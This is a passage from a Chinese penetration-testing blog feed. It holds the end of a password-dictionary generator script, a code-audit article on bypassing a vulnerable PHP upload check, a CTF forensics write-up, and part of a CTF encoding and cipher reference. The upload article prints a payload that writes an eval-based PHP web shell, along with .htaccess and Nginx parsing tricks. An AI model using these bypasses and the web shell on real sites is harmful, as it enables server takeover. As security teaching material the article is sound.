class="string">'\n'</span>)</div><div class="line">			f.write(d+c+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> name:</div><div class="line">    	<span class="keyword">for</span> f <span class="keyword">in</span> specialnum:</div><div class="line">    		f.write(e+f+<span class="string">'\n'</span>)</div><div class="line">    		f.write(f+e+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> id:</div><div class="line">    	<span class="keyword">for</span> b1 <span class="keyword">in</span> birth:</div><div class="line">    		f.write(i1+b1+<span class="string">'\n'</span>)</div><div class="line">    		f.write(b1+i1+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> id:</div><div class="line">    	<span class="keyword">for</span> s1 <span class="keyword">in</span> specialnum:</div><div class="line">    		f.write(i2+s1+<span class="string">'\n'</span>)</div><div class="line">    		f.write(s1+i2+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">	<span class="keyword">for</span> n1 <span class="keyword">in</span> name:</div><div class="line">   		<span class="keyword">for</span> b1 <span class="keyword">in</span> birth:</div><div class="line">    		<span class="keyword">for</span> s2 <span class="keyword">in</span> specialnum:</div><div class="line">    			f.write(n1+s2+b1+<span class="string">'\n'</span>)</div><div class="line">    			f.write(s2+n1+b1+<span class="string">'\n'</span>)</div><div class="line">    			f.write(s2+b1+n1+<span class="string">'\n'</span>)</div><div class="line"><span class="comment">#自行添加更多组合</span></div></pre></td></tr></table></figure><p></p><p>提醒一点就是如果你添加的信息越多，组合方式越多，那么生成的字典就越大，要考虑储存的容量问题。同时也推荐使用cupp.py和crunch。</p><h2 id="0x04-后话"><a href="#0x04-后话" class="headerlink" title="0x04 后话"></a>0x04 后话</h2><p>欢迎大家补充:P</p>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 弱口令字典 </tag>
            
            <tag> 弱口令 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[尽最大可能分析上传源码及漏洞利用方式]]></title>
      <url>/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h2 id="0x00-简单源码分析"><a href="#0x00-简单源码分析" class="headerlink" title="0x00 简单源码分析"></a>0x00 简单源码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)		<span class="comment">//检测Content-type值</span></div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))		       <span class="comment">//检测文件大小</span></div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));  <span class="comment">//获取最后“.”的后缀</span></div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)  			              <span class="comment">//检测是否为php后缀</span></div><div class="line">  	&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)		      <span class="comment">//返回上传错误码</span></div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Return Code: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span>													<span class="comment">//返回上传成功信息</span></div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))  <span class="comment">//检测文件是否存在</span></div><div class="line">      &#123;</div><div class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">      &#125;</div><div class="line">    <span class="keyword">else</span>			              <span class="comment">//将上传的临时文件转移到指定存放文件夹</span></div><div class="line">      &#123;</div><div class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">      <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;			    <span class="comment">//返回无效文件的错误信息</span></div><div class="line">  &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x01-详细分析过程"><a href="#0x01-详细分析过程" class="headerlink" title="0x01 详细分析过程"></a>0x01 详细分析过程</h2><p><strong>1) 直接使用用户上传文件名，没有过滤特殊字符，存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)		     <span class="comment">//文件类型检测</span></div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));  <span class="comment">//文件后缀检测</span></div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;</div><div class="line">  	</div><div class="line">  	<span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">      ......                                      <span class="comment">//省略了中间的一些代码</span></div><div class="line">``` </div><div class="line">以下代码的作用是，将上传到临时文件夹的文件移到upload的目录下     </div><div class="line">```php</div><div class="line"><span class="keyword">else</span>											 </div><div class="line"> &#123;</div><div class="line"> move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line"> <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line"> <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"> &#125;</div></pre></td></tr></table></figure><p><strong>1.1分析：</strong></p><p>从以上代码可以看出，可以上传图片文件，对文件拓展名检测是通过<code>end(explode(‘.’,$_FILES[“file”][“name”]))</code>函数实现（在这里先不说文件类型验证的问题）<code>explode(‘.’,$_FILES[“file”][“name”])</code>用来把上传的文件名作为字符串，以.(点)来分割字符串来生成数组，而<code>end()</code>函数则是将数组内部指针指向最后一个元素，并返回该元素的值，例如，当上传x.php文件时，最终就会获取到php。<br>而对于<code>$_FILES</code>里面获取变量，是直接来自http request请求，它跟普通获取其它get,post变量一样。 比如在post上传时，我们可以通过抓包来截获（常用神器burpsuite）这一过程，由于在上传的检测中没有对文件名进行检测和过滤及处理，因此，我们可以将name构造一个特殊文件名，然后，再将post数据提交，就可以达到上传绕过对文件扩展名的检测。</p><p><strong>1.2利用：</strong></p><p>比如我们可以在本地上将一个php文件命名为x.php.jpg在上传文件时，抓包post，将filename修改为<code>x.php\0.jpg</code>再提交post数据，那么在保存我们修改后的文件时，<code>\0</code>后面的所有字符将(如.jpg)被自动截断，最终生成我们想要目标文件格式(如本例的x.php)，以至于可以上传任意恶意的php脚本。从网上得到说明Php4的版本可以利用这个漏洞，php5版本以上会自动过滤掉<code>’”/0”</code>，另外很多asp,jsp也存在此类截断上传的漏洞。</p><p><strong>2)文件类型验证不严格，存在漏洞*</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;  	</div><div class="line">  	<span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p><strong>2.1分析:</strong></p><p>从代码可以看出是通过读取文件的type直接来做文件类型的判断，同样我们可以通过抓取post数据，将Content-type值修改为允许上传的MIME类型，在这里有image/gif等三种，从而绕过对文件type的检查，虽然之后代码对文件扩展名进行了检测(那两个个函数对文件扩展名检测的大慨过程就是判断文件名最后”.”的最后字符，example.php.bak最终得到是bak)，并判断是否是php后缀名。</p><p><strong>2.2利用:</strong></p><p>1.如果没有对apache默认支持解析文件方式进行修改时(即apache解析漏洞,很多网站管理员由于安全意识薄弱或其他情况往往没有修改)，那么在绕过对type的检测之后，最简单的利用方式就是我们可以直接上传一个恶意的名为x.php.ext，这里的ext可以是多种，只要不是php和apache可以解析其他扩展名(如txt后缀)就可以，那么按照apache默认从右往左直到遇到可支持解析的文件的解析方式，那么就会把x.php.ext当成x.php来解析。</p><p>2.在绕过对文件type检查之后，我们还可以将本地的x.php文件修改为x.php1,x.php3,x.php4或者x.php5再上传，默认的apache服务器将会解析为php。</p><p><strong>3)使用php的全等于来判断是否为php文件类型，存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</div><div class="line"><span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;  	</div><div class="line">  	<span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p><strong>3.1分析:</strong></p><p>我们知道在php语法中全等于”===”的作用是先判断等号左右两边的数据类型是否一样，再判断等号两边的值是否相等，如果都相等返回true，否者返回false。</p><p><strong>3.2利用:</strong></p><p>在明白全等于”===”的判断原理之后，我们就可以进行利用了，还是以本地的x.php举例，我们可以将x.php修改为Php, x.PHp, PHP…在绕过对type的检测之后再上传，以上传的x.PHP来分析，首先上传截获到的是PHP后缀，此时$ext=PHP，再将进行下一步的验证，$ext和php都是相同的数据类型，但是在验证它们值时却不相等，从而绕过上传。</p><p>而默认的web应用程序都是默认将<code>Php</code>，<code>x.PHp</code>,<code>PHP</code>…解析为php执行。</p><p><strong>4)对上传文件内容没有做检测，存在漏洞</strong></p><p><strong>4.1分析:</strong></p><p>从upload.php源代码分析来看，在整个过程没有对上传文件内容进行检测，过滤和处理，可以通过上传图片木马或其他方式来到达恶意上传的目的。</p><p><strong>4.2利用:</strong></p><p>1.如果的网站是用Nginx的Web应用程序且版本<code>&lt;8.03</code>，那我们就可以利用Nginx默认开启Fast-CGI而造成的畸形解析漏洞，以下是具体利用方式说明。在默认Fast-CGI开启状况下,我们可以上传一个名为x.jpg，其内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>的文件，之后我们再访问<code>x.jpg/.php</code>这个网站路径,在这个目录下就会生成一句话木马shell.php。</p><p>2.如果的网站是用Nginx的Web应用程序且版本在(<code>0.5.*，0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37</code>)其中，那我们还可以利用Nginx空字节代码执行漏洞来达到上传任意恶意代码并执行。具体利用方法是：将<code>x.jpg</code>图片中嵌入PHP代码然后通过访问<code>x.jpg%00.php</code>来执行其中的恶意代码。</p><p>3.如果网站的Apache Web应用程序中<code>.htaccess</code>可被执行且可被上传，那可以尝试在.htaccess中写入:<br><code>&lt;FilesMatch &quot;example.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code><br>这段代码的意思就是将把目录下的所有后缀为jpg的文件当做可执行的php脚本进行解析并执行。因此，我们可以上传一个x.jpg的木马, 这样x.jpg就可解析为php文件。</p>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 上传分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一道有趣的网络取证分析CTF题目]]></title>
      <url>/2017/02/28/%E4%B8%80%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90CTF%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>这是一道新颖的网络取证分析的题目，用TCP协议紧急数据来隐藏发送flag，很多选手都被其中的图片带偏了方向，导致花了很多时间也没有做出来，其实刚开始我也被带入坑:-(</p><a id="more"></a><p>下载题目使用Wireshark打开分析，整个过程为客服端请求<a href="http://secrets.ctf/message.png，然后与服务端进行TCP的三次握手建立连接，之后便开始分段传输数据，直到message.png传输完成释放连接。" target="_blank" rel="external">http://secrets.ctf/message.png，然后与服务端进行TCP的三次握手建立连接，之后便开始分段传输数据，直到message.png传输完成释放连接。</a></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/532952698.png" alt="1.png"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/155392968.png" alt="2.png"></p><p>然后我们就会毫不犹豫把message.png导出便开始分析，我就是这样被带入坑，然而分析N久，没有什么收获，然后开始怀疑是不是流量包还藏着其他信息没有get到，于是便开始仔细分析包，发现了些有趣的东西：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/413869343.png" alt="3.png"></p><p>从服务端向客服端发送message.png的分段数据开始到89号帧，每个TCP报文段控制位除了ACK（Acknowledgment）置1（表示确认号字段有效），URG（Urgent）位也都被置1（表示紧急指针字段有效，表明此报文段又紧急数据）</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/861147144.png" alt="4.png"></p><p>在上图可以看到紧急指针指向紧急数据的位置，其字段值为67（十进制格式），转换ASCII值为’C’，一直到第89号帧都有紧急数据，分析提取便得到了flag：CTF{And_You_Thought_It_Was_In_The_Picture}，嗨呀，好气，正如flag所说:-(</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> forensics </tag>
            
            <tag> networking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中那些脑洞大开的编码和加密]]></title>
      <url>/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:表哥，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。本来是想尽快写出参考的文章，无奈期间被各种事情耽搁导致文章断断续续写了2个月，文章肯定有许多没有提及到，欢迎小伙伴补充，总之，希望对小伙伴们有帮助吧！</p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><pre><code>常见编码:
    1.ASCII编码
    2.Base64/32/16编码
    3.shellcode编码
    4.Quoted-printable编码
    5.XXencode编码
    6.UUencode编码
    7.URL编码
    8.Unicode编码
    9.Escape/Unescape编码
    10.HTML实体编码
    11.敲击码(Tap code)
    12.莫尔斯电码(Morse Code)
    13.编码的故事

各种文本加密

换位加密:
    1.栅栏密码(Rail-fence Cipher)
    2.曲路密码(Curve Cipher)
    3.列移位密码(Columnar Transposition Cipher)

替换加密:
    1.埃特巴什码(Atbash Cipher)
    2.凯撒密码(Caesar Cipher)
    3.ROT5/13/18/47
    4.简单换位密码(Simple Substitution Cipher)
    5.希尔密码(Hill Cipher)
    6.猪圈密码(Pigpen Cipher)
    7.波利比奥斯方阵密码（Polybius Square Cipher)
    8.夏多密码(曲折加密)
    9.普莱菲尔密码(Playfair Cipher)
    10.维吉尼亚密码(Vigenère Cipher)
    11.自动密钥密码(Autokey Cipher)
    12.博福特密码(Beaufort Cipher)
    13.滚动密钥密码(Running Key Cipher)
    14.Porta密码(Porta Cipher)
    15.同音替换密码(Homophonic Substitution Cipher)
    16.仿射密码(Affine Cipher)
    17.培根密码(Baconian Cipher)
    18.ADFGX和ADFGVX密码(ADFG/VX Cipher)
    19.双密码(Bifid Cipher)
    20.三分密码(Trifid Cipher)
    21.四方密码(Four-Square Cipher)
    22.棋盘密码（Checkerboard Cipher)
    23.跨棋盘密码(Straddle Checkerboard Cipher)
    24.分组摩尔斯替换密码(Fractionated Morse Cipher)
    25.Bazeries密码(Bazeries Cipher)
    26.Digrafid密码(Digrafid Cipher)
    27.格朗普雷密码(Grandpré Cipher)
    28.比尔密码(Beale ciphers)
    29.键盘密码(Keyboard Cipher)

其他有趣的机械密码:
    1.恩尼格玛密码

代码混淆加密:
    1.asp混淆加密
    2.php混淆加密
    3.css/js混淆加密
    4.VBScript.Encode混淆加密
    5.ppencode
    6.rrencode
    7.jjencode/aaencode
    8.JSfuck
    9.jother
    10.brainfuck编程语言

相关工具

参考网站
</code></pre><a id="more"></a><h2 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h2><h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><h4 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1.ASCII编码"></a>1.ASCII编码</h4><p>ASCII编码大致可以分作三部分组成：</p><p>第一部分是：ASCII非打印控制字符（参详ASCII码表中0-31）;</p><p>第二部分是：ASCII打印字符，也就是CTF中常用到的转换;</p><p><img src="http://img2.tuicool.com/ZBBVN3f.jpg" alt="800px-Vigenère_square_shading.svg.png"></p><p>第三部分是：扩展ASCII打印字符(第一第三部分详见<a href="http://www.asciima.com/" target="_blank" rel="external">ASCII码表</a>解释)。</p><p>编码转换示例</p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p><img src="http://img0.tuicool.com/3UVj6rn.png" alt="小葵"></p><p>ASCII编码对应十进制：</p><pre><code>84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103
</code></pre><p>对应可以转换成二进制，八进制，十六进制等。</p><hr><h4 id="2-Base64-32-16编码"><a href="#2-Base64-32-16编码" class="headerlink" title="2.Base64/32/16编码"></a>2.Base64/32/16编码</h4><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。</p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：<br><img src="http://img2.tuicool.com/jiIR3yZ.png" alt="base64字母表.png"></p><p>举个例子(base64)：</p><blockquote><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p></blockquote><p>利用Python base64模块，我们分别可以这样加密解密base64 32 16：</p><p><img src="http://img0.tuicool.com/Q7RZvqM.png" alt="python加解base64.png"></p><hr><h4 id="3-shellcode编码"><a href="#3-shellcode编码" class="headerlink" title="3.shellcode编码"></a>3.shellcode编码</h4><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67
</code></pre><p><img src="http://img2.tuicool.com/VNBrEvE.png" alt="shellcode.png"></p><hr><h4 id="4-Quoted-printable-编码"><a href="#4-Quoted-printable-编码" class="headerlink" title="4.Quoted-printable 编码"></a>4.Quoted-printable 编码</h4><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码，编码原理<a href="http://blog.chacuo.net/494.html" target="_blank" rel="external">参考</a>。<br><img src="http://img1.tuicool.com/fmU7fij.png" alt="Quoted-printable 编码.png"><br>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p>编码后：</p><pre><code>=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7=8B=90=E7=8B=B8=E8=B7=B3=E8
=BF=87=E4=BA=86=E6=87=92=E6=83=B0=E7=9A=84=E7=8B=97
</code></pre><p>编码解码<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="external">链接</a></p><hr><h4 id="5-XXencode编码"><a href="#5-XXencode编码" class="headerlink" title="5.XXencode编码"></a>5.XXencode编码</h4><p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。<br><img src="http://img2.tuicool.com/m6VjIb3.png" alt="XXencode.png"></p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：<code>hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</code></p><p>编码解码<a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="external">链接</a></p><hr><h4 id="6-UUencode编码"><a href="#6-UUencode编码" class="headerlink" title="6.UUencode编码"></a>6.UUencode编码</h4><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：<code>M5&amp;AE(&#39;%U:6-K(&amp;)R;W=N(&amp;9O&gt;&quot;!J=6UP&lt;R!O=F5R(&#39;1H92!L87IY(&amp;1O9PH*</code></p><p>编码解码<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="external">链接</a></p><hr><h4 id="7-URL编码"><a href="#7-URL编码" class="headerlink" title="7.URL编码"></a>7.URL编码</h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67
</code></pre><p>编码解码<a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="external">链接</a></p><hr><h4 id="8-Unicode编码"><a href="#8-Unicode编码" class="headerlink" title="8.Unicode编码"></a>8.Unicode编码</h4><p>Unicode编码有以下四种编码方式：</p><p>源文本：<code>The</code></p><p>&amp;#x [Hex]：<code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p><p>&amp;# [Decimal]：<code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p><p>\U [Hex]：<code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]：<code>\U+0054\U+0068\U+0065</code></p><p>编码解码<a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="external">链接</a></p><hr><h4 id="9-Escape-Unescape编码"><a href="#9-Escape-Unescape编码" class="headerlink" title="9.Escape/Unescape编码"></a>9.Escape/Unescape编码</h4><p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p><p>源文本：<code>The</code></p><p>编码后：<code>%u0054%u0068%u0065</code></p><hr><h4 id="10-HTML实体编码"><a href="#10-HTML实体编码" class="headerlink" title="10.HTML实体编码"></a>10.HTML实体编码</h4><p><img src="http://img1.tuicool.com/feemAzq.png" alt="html实体编码.png"></p><p>完整编码手册<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="external">参考</a></p><hr><h4 id="11-敲击码"><a href="#11-敲击码" class="headerlink" 